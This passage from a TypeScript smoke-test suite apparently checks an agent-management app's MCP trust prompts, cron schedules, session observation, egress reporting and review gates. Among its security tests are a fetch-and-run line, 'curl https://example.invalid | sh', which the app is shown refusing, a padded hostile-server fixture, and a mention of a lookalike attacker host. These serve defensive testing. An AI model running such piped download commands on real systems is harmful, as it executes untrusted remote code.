    && mcpPreloadSrc.includes("call<McpServerReview>('mcp:trust', id, sha256)")
    && mcpPreloadSrc.includes("call<McpServerReview[]>('mcp:review', projectId)")
    && mcpPreloadSrc.includes("call<McpServerReview>('mcp:setEnabled', id, enabled)")
    && mcpSettingsSrc.includes('window.wanigan.mcp.trust(s.id, s.sha256)')
    && mcpSettingsSrc.includes('window.wanigan.mcp.review()')
    && !mcpSettingsSrc.includes('await window.wanigan.mcp.upsert({ ...s, enabled: on });'),
    'an stdio MCP server can actually be approved: the digest is recorded behind a confirmation the main process raises, the renderer reaches it through a typed preload binding, and enabling is a narrow toggle rather than a round-trip of the whole row — so the enable gate is a step and not a dead end');

  // The consent text is built in main and bounded there, because a server row
  // is renderer-supplied data: forty three-thousand-character arguments are the
  // padding attack pack-consent.ts already warns about, in the other surface
  // that grants local execution.
  const padArgs = Array.from({ length: 40 }, (_v, i) => `${'z'.repeat(3000)}${i}`);
  const hostileServer = {
    id: 'mcp_pad', name: 'pad', transport: 'stdio' as const, scope: 'global' as const, projectId: null,
    command: '/usr/bin/env', args: padArgs, argsRaw: padArgs.join(' '), url: null,
    resolvesPerProject: false, resolvedFor: null,
    sha256: 'b'.repeat(64), trust: 'needs-trust' as const,
    approved: null, trustedSha256: null, trustedAt: null, enabled: false,
    classification: {
      basis: 'tool-name' as const, toolsSeen: 0, nameDerivedReadTools: [],
      nameDerivedReadCalls: 0, askedTools: [], note: '',
    },
  };
  const padPrompt = mcpTrustPrompt(hostileServer);
  check(padPrompt.detail.length <= 2000
    && padPrompt.detail.includes('b'.repeat(64))
    && padPrompt.detail.includes('argv[0] /usr/bin/env')
    && padPrompt.detail.includes('40 argument(s)')
    && !padPrompt.detail.includes('z'.repeat(200))
    && padPrompt.detail.includes('Scope: every session Wanigan launches, in every repository')
    && padPrompt.detail.includes('Trusting does not enable')
    && padPrompt.detail.endsWith('Approve only a command you would run by hand.'),
    'the MCP trust dialog builds its own bounded summary — it states the true argument count, never joins two arguments into one line, and keeps the scope, the digest and the closing when the list has to be elided',
    padPrompt.detail.length);

  const httpPrompt = mcpTrustPrompt({
    ...hostileServer, transport: 'http' as const, command: null, args: [], argsRaw: '',
    url: 'https://example.com/mcp', trust: 'not-required' as const,
  });
  check(httpPrompt.detail.includes('runs no local command')
    && httpPrompt.detail.includes('Nothing was trusted.')
    && !httpPrompt.detail.includes('SHA-256')
    && !httpPrompt.detail.includes('argv['),
    'and an HTTP server, which executes nothing locally, is told it has nothing to approve rather than shown an empty command list');

  mcpRegistry.trustServer(srv.id, mcpReview!.sha256);
  mcpRegistry.setServerEnabled(srv.id, true);
  check(mcpRegistry.reviewServers(null).find((x) => x.id === srv.id)?.enabled === true,
    'and the same server enables once that exact command is trusted');
  const cfgPath = mcpRegistry.writeMcpConfig(null, tmp);
  check(cfgPath !== null && fs.existsSync(cfgPath), 'an .mcp.json-shaped config is generated');
  if (cfgPath) {
    // Never into the user's repo: the config belongs to Wanigan's own storage.
    check(!path.resolve(cfgPath).startsWith(path.resolve(tmp) + path.sep),
      'the generated MCP config is written outside the project');
  }

  // mcp_status had no writer — noteConnection and noteToolCall were never
  // called — so every server read "not seen yet" with zero calls, permanently.
  // Connection state genuinely is unknowable here (the CLI spawns these inside
  // the session's own process tree and reports nothing back), but use is not:
  // every MCP call arrives on the hook bus as mcp__<server>__<tool>.
  const mcpHookId = 's_smoke_mcp';
  const mcpHookFile = hooks.writeHookSettings(mcpHookId, tmp);
  const mcpHandler = handlerFromSettings(mcpHookFile);
  check(mcpHandler !== null, 'MCP-use telemetry is carried by a scoped hook capability');
  const mcpCall = (tool: string, event = 'PostToolUse') => hookPost(mcpHandler, {
    hook_event_name: event, tool_name: tool, tool_use_id: `t_${Math.random()}`,
  });
  await mcpCall('mcp__smoke-fs__read_file');
  await mcpCall('mcp__smoke-fs__read_file');
  await mcpCall('mcp__smoke-fs__write_file', 'PostToolUseFailure');
  await mcpCall('Bash');
  // hooks.ts clips a tool name at 64 characters, so a clipped id can lose its
  // second separator. Dropped rather than credited to a server that never ran.
  await mcpCall('mcp__smoke-fs');
  hooks.cleanupHookSettings(mcpHookId);

  const use = mcpRegistry.serverStatuses().find((x) => x.id === srv.id);
  check(use?.toolCalls === 3, 'MCP use is counted from the calls the agents actually made', use?.toolCalls);
  check(use?.failures === 1, 'and the failures are counted apart from them', use?.failures);
  check((use?.lastUsedAt ?? 0) > 0, 'with the moment one last completed', use?.lastUsedAt);

  // Registered and trusted, so it is genuinely enabled — the point of the check
  // below is that nobody has called it, not that it was never turned on.
  const idle = mcpRegistry.upsertServer({
    projectId: null, name: 'smoke-unused', transport: 'stdio',
    command: 'echo', args: '', enabled: false,
  });
  const idleReview = mcpRegistry.reviewServers(null).find((x) => x.id === idle.id);
  mcpRegistry.trustServer(idle.id, idleReview!.sha256);
  mcpRegistry.setServerEnabled(idle.id, true);
  const idleUse = mcpRegistry.serverStatuses().find((x) => x.id === idle.id);
  check(idleUse?.toolCalls === 0 && idleUse?.lastUsedAt === null,
    'a server nobody has called reads as unused, which is not the same as broken');
  mcpRegistry.removeServer(idle.id);

  // A row switched on whose command is not approved is withheld from every
  // config Wanigan writes. That used to be a console.warn and nothing else,
  // while Settings printed a plain "on" beside it, so the server had silently
  // stopped being handed out and the page said the opposite.
  const legacy = mcpRegistry.upsertServer({
    projectId: null, name: 'smoke-legacy', transport: 'stdio',
    command: 'echo', args: 'legacy', enabled: false,
  });
  const legacyReview = mcpRegistry.reviewServers(null).find((x) => x.id === legacy.id);
  mcpRegistry.trustServer(legacy.id, legacyReview!.sha256);
  mcpRegistry.setServerEnabled(legacy.id, true);
  // Changed underneath the approval, which is the shape a database written
  // before this gate existed is full of: enabled, and approved for nothing.
  db().prepare('UPDATE mcp_servers SET args = ? WHERE id = ?').run('legacy --write', legacy.id);
  const nowWithheld = mcpRegistry.reviewServers(null).find((x) => x.id === legacy.id);
  check(nowWithheld?.enabled === true && nowWithheld?.trust === 'needs-trust'
    && nowWithheld?.approved?.args === 'legacy'
    && mcpRegistry.untrustedEnabledServers(null).some((x) => x.id === legacy.id),
    'a server switched on whose command no longer matches its approval reads as enabled-and-unapproved and still names the line that was approved, so the page can say what changed rather than only that something did');
  const legacyCfg = mcpRegistry.writeMcpConfig(null, tmp);
  const legacyEntries = legacyCfg ? (JSON.parse(fs.readFileSync(legacyCfg, 'utf8')) as { mcpServers: Record<string, unknown> }).mcpServers : {};
  check(!('smoke-legacy' in legacyEntries) && 'smoke-fs' in legacyEntries,
    'and it is left out of the generated config while the approved server beside it is written, so an unapproved command is never spawned');
  check(mcpSettingsSrc.includes("s.trust === 'needs-trust' ? WITHHELD : ON")
    && mcpSettingsSrc.includes('left out of every config until this command is approved')
    && mcpSettingsSrc.includes("s.enabled && s.trust === 'needs-trust'"),
    'and Settings renders that row as withheld with a standing note naming it, rather than as a plain "on" beside a server nothing is receiving');
  mcpRegistry.removeServer(legacy.id);

  mcpRegistry.removeServer(srv.id);
  check(!mcpRegistry.listServers(null).some((x) => x.id === srv.id), 'it can be removed again');

  /* ── phase 23 · settings precedence ────────────────────────────────── */
  say('── phase 23 · settings precedence');
  const proj = path.join(tmp, 'cfgproj');
  fs.mkdirSync(path.join(proj, '.claude'), { recursive: true });
  fs.writeFileSync(path.join(proj, '.claude', 'settings.json'),
    JSON.stringify({ model: 'from-project', cleanupPeriodDays: 5 }));
  fs.writeFileSync(path.join(proj, '.claude', 'settings.local.json'),
    JSON.stringify({ model: 'from-local' }));
  const pc = ctxConfig.readProjectConfig(proj);
  const model = pc.settings.find((x) => x.key === 'model');
  check(model?.from === 'local', 'local settings win over project settings', model?.from);
  check((model?.shadowed ?? []).some((s) => s.from === 'project'),
    'the panel can say what the winning layer overrode');

  const budget = ctxConfig.contextBudget(proj, []);
  check(budget.estTokens === 0 && /estimate/i.test(budget.note),
    'an empty context costs nothing and still says it is an estimate');

  /* ── phase 25 · durable schedules ──────────────────────────────────── */
  say('── phase 25 · schedules');

  // A cron parser is the kind of code that looks right and is off by an hour.
  const at = (y: number, mo: number, d: number, h: number, mi: number) => new Date(y, mo - 1, d, h, mi, 0, 0).getTime();
  const fire = (expr: string, from: number) => schedule.nextFire(expr, from);
  const iso = (t: number | null) => (t === null ? 'never' : new Date(t).toLocaleString());

  check(fire('*/15 * * * *', at(2026, 6, 1, 9, 7)) === at(2026, 6, 1, 9, 15), 'a step lands on the next multiple');
  check(fire('0 9 * * *', at(2026, 6, 1, 9, 30)) === at(2026, 6, 2, 9, 0), 'a daily job past its time waits for tomorrow');
  check(fire('0 9 * * 1-5', at(2026, 6, 6, 12, 0)) === at(2026, 6, 8, 9, 0), 'a weekday job skips the weekend', iso(fire('0 9 * * 1-5', at(2026, 6, 6, 12, 0))));
  check(fire('30 14 15 3 *', at(2026, 4, 1, 0, 0)) === at(2027, 3, 15, 14, 30), 'an annual date rolls to next year');
  // Sunday is both 0 and 7 in vixie-cron, and getting that wrong shifts a
  // weekly job by a day without ever failing loudly.
  check(fire('0 8 * * 7', at(2026, 6, 1, 0, 0)) === fire('0 8 * * 0', at(2026, 6, 1, 0, 0)), '7 and 0 both mean Sunday');
  // When both day fields are constrained, either matching counts.
  const both = fire('0 0 1 * 5', at(2026, 5, 2, 0, 0));
  check(both === at(2026, 5, 8, 0, 0), 'day-of-month OR day-of-week, not AND', iso(both));
  check(fire('0 0 30 2 *', Date.now()) === null, '30 February never fires, and says so');

  for (const bad of ['* * * *', '61 * * * *', '* 25 * * *', 'every minute', '*/0 * * * *']) {
    let threw = false;
    try { schedule.parseCron(bad); } catch { threw = true; }
    check(threw, `"${bad}" is rejected rather than stored`);
  }

  check(schedule.describeCron('*/15 * * * *').includes('15'), 'a step reads as words');
  check(/weekday/i.test(schedule.describeCron('0 9 * * 1-5')), 'weekdays read as words', schedule.describeCron('0 9 * * 1-5'));

  const sch = schedule.createSchedule({
    name: 'smoke nightly audit', cron: '0 3 * * *', kind: 'headless',
    payload: { prompt: 'audit' }, projectId: null,
  });
  check(sch.nextAt !== null && sch.nextAt > Date.now(), 'a new schedule is armed for the future');
  check(schedule.listSchedules().some((x) => x.id === sch.id), 'it is listed');
  const off = schedule.setScheduleEnabled(sch.id, false);
  check(off?.enabled === false && off?.nextAt === null, 'disabling disarms it rather than leaving it primed');
  const on = schedule.setScheduleEnabled(sch.id, true);
  check(on?.nextAt !== null && (on?.nextAt ?? 0) > Date.now(), 're-enabling re-arms from now, not from the backlog');

  // Editing in place: the row keeps its history, the kind is fixed, an
  // unpinned headless schedule must declare its fan-out, and the change is
  // written to the same history the operator audits.
  const edited = schedule.updateSchedule(sch.id, { cron: '0 4 * * *', name: 'smoke nightly audit (04:00)', payload: { prompt: 'audit', allProjects: true } });
  check(edited?.cron === '0 4 * * *' && edited?.name === 'smoke nightly audit (04:00)', 'an edit changes cron and name in place', edited);
  check((edited?.nextAt ?? 0) > Date.now() && edited?.nextAt !== on?.nextAt, 'an edited cron re-arms from now', { before: on?.nextAt, after: edited?.nextAt });
  check(schedule.scheduleHistory(sch.id).some((h) => h.status === 'edited' && /cron 0 3 \* \* \* → 0 4 \* \* \*/.test(h.detail ?? '')),
    'the edit is recorded in the schedule history with the old and new cron', schedule.scheduleHistory(sch.id));
  let kindRefused = false;
  try { schedule.updateSchedule(sch.id, { kind: 'batch' }); } catch { kindRefused = true; }
  check(kindRefused, 'an edit cannot change the kind');
  let fanOutRefused = false;
  try { schedule.updateSchedule(sch.id, { payload: { prompt: 'audit' } }); } catch { fanOutRefused = true; }
  check(fanOutRefused, 'an unpinned headless schedule that drops allProjects is refused');
  let cronRefused = false;
  try { schedule.updateSchedule(sch.id, { cron: '0 0 31 2 *' }); } catch { cronRefused = true; }
  check(cronRefused, 'an edit to a cron that never fires is refused');
  check(schedule.updateSchedule('sch_does_not_exist', { name: 'x' }) === null, 'editing a missing schedule returns null, not a throw');

  // An attended window and the background service can both retain the same
  // due row from their initial SELECT. Claim that deliberately stale snapshot
  // twice, then run a normal later tick: only the first may enqueue or record
  // a firing. This reaches the cross-process CAS, not just the local guard.
  const atomicName = `smoke atomic once ${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 7)}`;
  const atomic = schedule.createSchedule({
    name: atomicName, cron: '* * * * *', kind: 'headless', payload: { prompt: 'run once' }, projectId: null,
  });
  db().prepare('UPDATE schedules SET next_at=? WHERE id=?').run(Date.now() - 1, atomic.id);
  try {
    const stale = db().prepare('SELECT * FROM schedules WHERE id=?').get(atomic.id) as
      Parameters<typeof schedule.__test.claimDueSnapshot>[0];
    const claimAt = Date.now();
    const first = schedule.__test.claimDueSnapshot(stale, claimAt);
    const concurrent = schedule.__test.claimDueSnapshot(stale, claimAt);
    const repeated = await schedule.tickSchedules();
    const queued = db().prepare('SELECT COUNT(*) AS n FROM queue WHERE label=?').get(atomicName) as { n: number };
    const fired = schedule.listSchedules().find((row) => row.id === atomic.id);
    const history = schedule.scheduleHistory(atomic.id);
    check(first && !concurrent && repeated === 0,
      'stale concurrent and repeated ticks cannot fire one due schedule twice', JSON.stringify({ first, concurrent, repeated }));
    check(queued.n === 1 && fired?.runs === 1 && history.length === 1,
      'an atomic schedule claim makes exactly one queue item and history row',
      JSON.stringify({ queued: queued.n, runs: fired?.runs, history: history.length }));
  } finally {
    db().prepare('DELETE FROM queue WHERE label=?').run(atomicName);
    schedule.deleteSchedule(atomic.id);
  }

  let rejected = false;
  try { schedule.createSchedule({ name: 'bad', cron: '0 0 31 2 *', kind: 'headless', payload: {} }); }
  catch { rejected = true; }
  check(rejected, 'a schedule that can never fire is refused at creation');

  check(schedule.deleteSchedule(sch.id), 'it can be deleted');

  // 'session' is gone from the Schedules form — no runner was ever registered
  // for the kind, so every session schedule ever created sat in the queue
  // blocked on 'no runner registered'. The stored shape still admits it,
  // deliberately: rows written by older builds are in people's databases, and
  // a type that narrows while the table can still return the value is a type
  // that lies. The list marks those rows dead instead.
  // Written the way an older build wrote it, because createSchedule now
  // refuses the kind outright: a schedule nothing can ever run should not be
  // creatable, and the row still has to read back for the people who have one.
  const legacyId = 'sch_smoke_legacy_session';
  db().prepare(`INSERT INTO schedules (id,name,cron,kind,payload_json,project_id,enabled,created_at,next_at)
    VALUES (?,?,?,?,?,?,1,?,?)`)
    .run(legacyId, 'smoke legacy session row', '0 4 * * *', 'session', '{}', null, Date.now(), Date.now() + 60_000);
  check(schedule.listSchedules().find((x) => x.id === legacyId)?.kind === 'session',
    "a 'session' row written by an older build still reads back rather than throwing");
  let refusedSession = false;
  try {
    schedule.createSchedule({ name: 'smoke rejected session row', cron: '0 4 * * *', kind: 'session' as never, payload: {} });
  } catch { refusedSession = true; }
  check(refusedSession, 'but a new session schedule is refused, since no runner could ever claim it');
  check(schedule.deleteSchedule(legacyId), 'and it can be deleted, which is what the list tells you to do');

  /* ── phase 27 · sessions Wanigan did not start ─────────────────────── */
  // VS Code's agent host is on by default, so the ordinary state of a machine
  // is several Claude processes running and Wanigan aware of none of them —
  // "how many agents are running" wrong, and wrong silently. Everything below
  // runs against a sandbox registry so it never depends on what is really up.
  say('── phase 27 · observed sessions');
  const obsHome = fs.mkdtempSync(path.join(os.tmpdir(), 'wanigan-obs-'));
  const obsReg = path.join(obsHome, 'sessions');
  fs.mkdirSync(obsReg, { recursive: true });
  const obsPrevDir = process.env.CLAUDE_CONFIG_DIR;
  process.env.CLAUDE_CONFIG_DIR = obsHome;
  // Accounts are part of "where Claude config lives" now, so the sandbox has to
  // cover them too. The observer reads every account directory on purpose — a
  // session started under the work account is still a running agent — which
  // means leaving the adopted account pointed at the real ~/.claude would make
  // these assertions depend on what is genuinely running on this machine, the
  // exact coupling the sandbox exists to remove. Written directly because the
  // fixture path is deliberately outside the roots create() will accept.
  const obsPrevDirs = (db().prepare('SELECT id, config_dir FROM agent_accounts WHERE harness=?')
    .all('claude-code') as { id: string; config_dir: string }[]);
  db().prepare("UPDATE agent_accounts SET config_dir=? WHERE harness='claude-code'").run(obsHome);
  const obsWasOn = observed.observedEnabled();
  try {
    // This process is the only pid whose start time we can state, so it stands
    // in for a foreign session; `startedAt` is epoch ms, which is the field ps
    // can actually be compared against (procStart in the real files is UTC
    // while ps prints local time, and those disagree by the machine's offset).
    const ourStart = Date.now() - Math.round(process.uptime() * 1000);
    const writeEntry = (name: string, body: Record<string, unknown>) =>
      fs.writeFileSync(path.join(obsReg, `${name}.json`), JSON.stringify(body));
    const liveEntry = (over: Record<string, unknown> = {}) => ({
      pid: process.pid, sessionId: `smoke-observed-${process.pid}`, cwd: tmp,
      startedAt: ourStart, name: 'smoke-observed', entrypoint: 'cli',
      kind: 'agent', version: '2.0.0', ...over,
    });

    observed.setObservedEnabled(false);
    writeEntry(String(process.pid), liveEntry());
    check((await observed.listObserved()).length === 0,
      'nothing is read while the lane is off, which is also its default');
    const off = observed.observedState();
    check(off.enabled === false && /not looking/i.test(off.note ?? ''),
      '"switched off" and "nothing running" are different sentences, and state carries both', off.note);

    observed.setObservedEnabled(true);
    // An editor lock, which is how a session is joined to the window holding it
    // open — the lock filename is a websocket port and its `pid` is the
    // editor's, so joining on pid matches nothing at all.
    fs.mkdirSync(path.join(obsHome, 'ide'), { recursive: true });
    fs.writeFileSync(path.join(obsHome, 'ide', '54321.lock'), JSON.stringify({
      pid: 91396, ideName: 'Smoke Editor', authToken: 'tok_smoke_do_not_leak', workspaceFolders: [tmp],
    }));

    const listed = await observed.listObserved();
    const row = listed.find((r) => r.pid === process.pid);
    check(row !== undefined, 'a live registry entry is listed once the lane is on', listed.length);
    check(row?.sessionId === `smoke-observed-${process.pid}`, "and it carries the CLI's own session id");
    check(row?.verified === true,
      'start-verified against ps, so the row means "this session", not "that pid answers a signal"');
    check(row?.editor === 'Smoke Editor', 'the editor is resolved through workspaceFolders, not through pid', row?.editor);
    check(!JSON.stringify(listed).includes('tok_smoke_do_not_leak'),
      "the lock's auth token never reaches a row — the only thing a renderer could do with it is use it");
    check(!JSON.stringify(listed).includes('.sock'),
      'and neither does the messaging socket path, for the same reason');
    check(observed.OBSERVE_ONLY_NOTICE === observed.observedState().notice,
      'the observe-only sentence has one source, so the UI copy cannot drift from what the code does');

    // kill(pid, 0) alone cannot tell a live session from a stale file whose pid
    // the kernel has since handed to something else.
    writeEntry(String(process.pid), liveEntry({ startedAt: ourStart - 6 * 3600_000 }));
    check((await observed.listObserved()).length === 0,
      'a stale file whose pid was recycled is dropped, not shown as a running session');

    writeEntry(String(process.pid), liveEntry({ startedAt: null }));
    const unverified = (await observed.listObserved()).find((r) => r.pid === process.pid);
    check(unverified?.verified === false,
      'a file with no start time survives as unverified rather than as a claim the module cannot support');

    // ps renders lstart through the C library's locale and Date.parse only reads
    // English, so the machine that breaks this reader is one that is not in an
    // English locale — and ps cannot be asked for a Japanese line on demand, so
    // the parse is exercised directly. The three answers are three different
    // facts about a process, and collapsing any two of them loses a row.
    const psEnglish = observed.parsePsStart('54186 Sun Sep  6 01:14:20 2026');
    check(psEnglish !== null && psEnglish.pid === 54186 && psEnglish.at !== null,
      'a C-locale ps line yields its pid and a real start time', JSON.stringify(psEnglish));
    const psJapanese = observed.parsePsStart('54186 2026年 9月 6日 日曜日 01時14分20秒');
    check(psJapanese !== null && psJapanese.pid === 54186 && psJapanese.at === null,
      'a date Date.parse cannot read still yields the pid, so "ps listed this process" outlives "we could not date it"',
      JSON.stringify(psJapanese));
    check(observed.parsePsStart('PID STARTED') === null && observed.parsePsStart('   ') === null,
      'and a line with no pid on it is not a process at all, which is a third answer rather than a pid of NaN');

    fs.rmSync(path.join(obsReg, `${process.pid}.json`));
    writeEntry('999999', { pid: 999999, sessionId: 'smoke-dead', cwd: tmp, startedAt: Date.now() });
    check((await observed.listObserved()).length === 0, 'a pid that is not alive is dropped');

    fs.rmSync(path.join(obsReg, '999999.json'));
    writeEntry(String(process.pid), liveEntry({ pid: process.pid + 1 }));
    check((await observed.listObserved()).length === 0,
      'a renamed or copied registry file cannot invent a session — the filename and the pid inside must agree');

    // The whole design, in one assertion: acting on a foreign session would
    // need a hook written into the user's machine-wide ~/.claude, and this
    // module writes nothing there.
    writeEntry(String(process.pid), liveEntry());
    const before = filesUnder(obsHome).map((f) => `${f}:${fs.statSync(f).size}`).join('|');
    await observed.listObserved();
    observed.observedState();
    await observed.listObserved();
    check(filesUnder(obsHome).map((f) => `${f}:${fs.statSync(f).size}`).join('|') === before,
      'observing writes nothing under the CLI’s own config directory — reading is the whole feature');

    // Parsing three answers is only half of it; the locale has to be pinned on
    // the probe itself. A machine printing 07/09/2026 for the 7th of September
    // parses as the 9th of July — sixty days out, past START_SLACK_MS — so the
    // row leaves down the branch that is supposed to mean "this registry file is
    // stale", and a live session vanishes from the count with nobody told.
    check(/LC_ALL:\s*'C'/.test(sourceOf('src/main/observed.ts')),
      'the ps probe pins LC_ALL=C, so lstart arrives in the one format the parser can read');
  } finally {
    observed.setObservedEnabled(obsWasOn);
    if (obsPrevDir === undefined) delete process.env.CLAUDE_CONFIG_DIR;
    else process.env.CLAUDE_CONFIG_DIR = obsPrevDir;
    for (const row of obsPrevDirs) {
      db().prepare('UPDATE agent_accounts SET config_dir=? WHERE id=?').run(row.config_dir, row.id);
    }
    fs.rmSync(obsHome, { recursive: true, force: true });
  }

  /* ── what leaves this machine ──────────────────────────────────────── */
  // The Settings panel prints this report verbatim and knows no hostname of its
  // own. That is only honest while the report is complete, so the check that
  // matters is the one that fails when somebody adds a sixth outbound call.
  say('── egress report');
  await otel.startCollector();
  const report = egressReport();
  check(report.hosts.length > 0 && report.pins.length > 0 && report.paths.length > 0,
    'the report is populated — an empty one has to read as the report failing, not as proof nothing leaves');

  const mainDir = path.join(appRoot(), 'src', 'main');
  const named = new Set<string>();
  for (const file of filesUnder(mainDir)) {
    if (!file.endsWith('.ts')) continue;
    // This suite ships inside src/main but never connects anywhere: it names
    // lookalike hosts on purpose, so that the credential-strip check can prove
    // https://api.anthropic.com.evil.io is treated as a redirect rather than as
    // the real endpoint. Scanning our own fixtures would report them as
    // undeclared egress and, worse, invite someone to "fix" it by adding an
    // attacker-shaped host to the Settings table. Every module that can actually
    // open a socket is still scanned.
    if (/[\\/]smoke\d*\.ts$/.test(file)) continue;
    for (const m of fs.readFileSync(file, 'utf8').matchAll(/https:\/\/([A-Za-z0-9.-]+)/g)) {
      named.add(m[1].toLowerCase());
    }
  }
  check(named.size >= 2, 'the main-process source is readable, so the next check means something', [...named].join(', '));
  // RFC 2606 reserves these for documentation; they turn up in an error message
  // showing the shape of an MCP URL, never as somewhere Wanigan connects.
  const DOC_HOSTS = new Set(['example.com', 'example.org', 'example.net']);
  const onTable = new Set(report.hosts.map((h) => h.host));
  const unlisted = [...named].filter((h) => !DOC_HOSTS.has(h) && !onTable.has(h));
  check(unlisted.length === 0,
    'every host the main process names is on the table the Settings panel prints', unlisted.join(', '));

  check(report.hosts.some((h) => h.by === 'agent' && h.activeNow === null),
    "the CLI's own traffic is listed as unknown rather than absent — Wanigan cannot read its login");
  const pinned = new Map(report.pins.map((p) => [p.name, p.value]));
  for (const name of ['OTEL_LOG_USER_PROMPTS', 'OTEL_LOG_ASSISTANT_RESPONSES',
                      'OTEL_LOG_TOOL_CONTENT', 'OTEL_LOG_RAW_API_BODIES']) {
    // The claim that conversation text stays out of the database rests entirely
    // on these four being pinned on every launch.
    check(pinned.get(name) === 'false', `${name} is reported pinned to the value otelEnv really sets`, pinned.get(name));
  }
  const token = otel.collectorToken();
  check(!token || !JSON.stringify(report).includes(token),
    'the collector token is not in the report — the exporter headers carry it and are never surfaced');
  check(report.unenumerated.length >= 5 && report.provenance.length > 40,
    'the caveats that stop the table overclaiming are carried whole, not summarised');
  otel.stopCollector();

  /* ── phase 30 · durable work control ─────────────────────────────── */
  say('── phase 30 · durable work control');
  const controlRepo = path.join(tmp, 'control-repo');
  fs.mkdirSync(controlRepo, { recursive: true });
  try {
    const gitControl = (...args: string[]) => execFileSync('git', ['-C', controlRepo, ...args], { stdio: 'pipe' }).toString();
    gitControl('init', '-q', '-b', 'main');
    gitControl('config', 'user.email', 'smoke@wanigan.test');
    gitControl('config', 'user.name', 'Smoke');
    fs.writeFileSync(path.join(controlRepo, 'README.md'), '# control\n');
    gitControl('add', '-A'); gitControl('commit', '-qm', 'base');
    const controlProject = await addProject(controlRepo);
    const docket = control.createDocket({ projectId: controlProject.id, title: 'Control smoke',
      objective: 'Prove the work contract survives without a live terminal.',
      acceptance: ['Review gate passes.', 'A human review decision is recorded.'], risk: 'elevated' });
    check(docket.nodes.length === 4 && docket.nodes[0].status === 'ready' && docket.nodes[1].status === 'blocked',
      'a docket creates a dependency graph rather than four uncoordinated sessions');
    // The four default phases, their kinds and the plan limits left control.ts
    // for shared/types so a renderer plan editor seeds from exactly what main
    // would have written. Loaded dynamically because this one check is the only
    // place the smoke needs the values, and the static import above is shared.
    const sharedPlan = await import('../shared/types');
    check(sharedPlan.DEFAULT_DOCKET_PLAN.length === 4
      && sharedPlan.DEFAULT_DOCKET_PLAN.at(-1)?.kind === 'review'
      && sharedPlan.DOCKET_NODE_KINDS.length === 4,
      'the default docket plan still ends in review, and its four node kinds are declared once for both processes');
    const planNode = docket.nodes.find((node) => node.kind === 'plan')!;
    const implementNode = docket.nodes.find((node) => node.kind === 'implement')!;
    control.claimPath(implementNode.id, 'src/control.ts');
    let overlapRefused = false;
    try {
      const second = control.createDocket({ projectId: controlProject.id, title: 'Collision', objective: 'Try an overlapping claim.',
        acceptance: ['It is refused.'] });
      control.claimPath(second.nodes.find((node) => node.kind === 'implement')!.id, 'src');
    } catch { overlapRefused = true; }
    check(overlapRefused, 'an overlapping live file claim is refused before parallel work starts');
    // The goal capsule: what a node's agent is told at launch beyond the prompt,
    // every line a stored fact and the whole thing labelled a snapshot.
    const capsule = control.goalCapsuleFor(implementNode.id);
    check(capsule.nodeId === implementNode.id && capsule.docketId === docket.id && capsule.claimPath === 'src/control.ts'
      && capsule.dependsOn.some((dep) => dep.nodeId === planNode.id && dep.status === 'ready')
      && !capsule.siblingClaims.some((claim) => claim.nodeId === implementNode.id),
    'a goal capsule carries the node id, its declared claim and its prerequisites, and never lists its own claim as a sibling', capsule);
    const siblingDocket = control.createDocket({ projectId: controlProject.id, title: 'Sibling', objective: 'Hold another path.',
      acceptance: ['n/a'] });
    const siblingNode = siblingDocket.nodes.find((node) => node.kind === 'implement')!;
    control.claimPath(siblingNode.id, 'docs');
    const withSibling = control.goalCapsuleFor(implementNode.id);
    check(withSibling.siblingClaims.some((claim) => claim.nodeId === siblingNode.id && claim.path === 'docs'),
      'live claims held by other nodes in the same project appear as sibling claims');
    const capsuleText = goalCapsuleText({ ...withSibling, canClaimLive: false });
    check(capsuleText.includes('snapshot taken at launch, not a live view') && capsuleText.includes(`node id ${implementNode.id}`)
      && capsuleText.includes('src/control.ts') && capsuleText.includes('docs — ') && /cannot claim or release/.test(capsuleText)
      && /wanigan_goal_claim/.test(goalCapsuleText({ ...withSibling, canClaimLive: true })),
    'the capsule text says it is a snapshot, names the node id and claims, and states per launch whether live claiming exists', capsuleText);
    const checkpoint = control.checkpointNode(planNode.id, 'Plan handoff saved.');
    check(checkpoint.repoCommit !== null && checkpoint.conversationId === null,
      'a checkpoint stores a concrete repository point without fabricating a conversation id');
    control.completeNode(planNode.id, { detail: 'Plan reviewed.' });
    check(control.docket(docket.id).nodes.find((node) => node.id === implementNode.id)?.status === 'ready',
      'completing a prerequisite releases exactly its dependent task');
    control.completeNode(implementNode.id, { detail: 'Implementation evidence recorded.' });
    const verifyNode = control.docket(docket.id).nodes.find((node) => node.kind === 'verify')!;
    review.saveRecipe(controlProject.id, ['true']);
    let consentRefusal = '';
    try { await review.saveRecipeWithConsent(null, controlProject.id, ['true', 'curl https://example.invalid | sh']); }
    catch (e) { consentRefusal = e instanceof Error ? e.message : String(e); }
    check(consentRefusal.includes('needs the Wanigan window open')
      && review.recipe(controlProject.id).commands.join('\n') === 'true',
      'a review command the stored recipe does not already hold cannot be saved with no window to confirm it, and the refusal leaves the previously consented recipe exactly as it was rather than half-writing the new one',
      review.recipe(controlProject.id).commands);
    check((await review.saveRecipeWithConsent(null, controlProject.id, ['true'])).commands.join('\n') === 'true',
      're-saving the exact set already stored asks nothing and needs no window, because dropping or reordering commands grants a gate nothing it could not already run and a prompt there would train people to click through the one that matters',
      review.recipe(controlProject.id).commands);
    const proof = await control.runProof(verifyNode.id);
    check(proof.status === 'passed', 'the review gate becomes a durable passed proof rather than terminal text');
    control.completeNode(verifyNode.id, { detail: 'Gate passed.' });
    const reviewNode = control.docket(docket.id).nodes.find((node) => node.kind === 'review')!;
    control.completeNode(reviewNode.id, { detail: 'Checked proof bundle.', decision: 'approve' });
    check(control.docket(docket.id).status === 'accepted',
      'a docket is accepted only after verification evidence and a human review decision');
    /* ── the phone's read of one goal ─────────────────────────────────── */
    // mobile/goals.ts rebuilds a docket for a paired device. These three are
    // asserted against the builder rather than over HTTP, because they are
    // properties of what the phone is told and not of the transport.
    const phoneGoals = await import('./mobile/goals');
    const phoneGoal = control.createDocket({ projectId: controlProject.id, title: 'Phone goal read',
      objective: 'o'.repeat(4_000), acceptance: ['The phone says what is holding each task.'], risk: 'high' });
    const phonePlan = phoneGoal.nodes.find((node) => node.kind === 'plan')!;
    const phoneImplement = phoneGoal.nodes.find((node) => node.kind === 'implement')!;
    control.claimPath(phoneImplement.id, 'src/phone-goal-claim.ts');
    control.completeNode(phonePlan.id, { decision: 'request_changes', detail: 'The plan needs rework.' });
    const phoneRecord = control.docket(phoneGoal.id);
    const phoneWire = phoneGoals.mobileGoal(phoneRecord);
    const phoneHeld = phoneWire.tasks.find((task) => task.title === phoneImplement.title);
